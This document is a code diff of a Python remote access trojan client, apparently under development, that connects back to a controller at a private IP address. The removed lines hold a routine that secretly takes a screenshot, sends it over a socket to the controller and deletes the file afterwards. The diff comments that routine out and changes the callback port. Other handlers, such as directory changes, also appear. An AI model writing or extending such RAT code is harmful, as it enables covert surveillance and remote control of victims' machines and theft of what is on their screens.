@@ -6,7 +6,7 @@ import os
 import base64
 import json
 import time
-import pyautogui
+
 
 class CLIENT:
 
@@ -57,18 +57,18 @@ class CLIENT:
         
     def screenshot(self):
         file = 'screenshot.png'
-        pyautogui.screenshot(file)
-        time.sleep(5)
-        file = open(file, 'rb')
-        file_data = file.read()
-        data_len = len(file_data)
-        str_data_len = str(data_len)
-        sock.send(str_data_len.encode())
-        time.sleep(1)
-        sock.send(file_data)
-        file.close()
-        time.sleep(.2)
-        subprocess.run(['rm', 'screenshot.png'])
+        # pyautogui.screenshot(file)
+        # time.sleep(5)
+        # file = open(file, 'rb')
+        # file_data = file.read()
+        # data_len = len(file_data)
+        # str_data_len = str(data_len)
+        # sock.send(str_data_len.encode())
+        # time.sleep(1)
+        # sock.send(file_data)
+        # file.close()
+        # time.sleep(.2)
+        # subprocess.run(['rm', 'screenshot.png'])
         
     def cd(self, command):
         os.chdir(command[3:])
@@ -130,7 +130,7 @@ class CLIENT:
                 continue
 
                 
-rat = CLIENT('192.168.56.113', 3312)
+rat = CLIENT('192.168.56.113', 4442)
 
 if __name__ == '__main__':
     # rat.installdep()
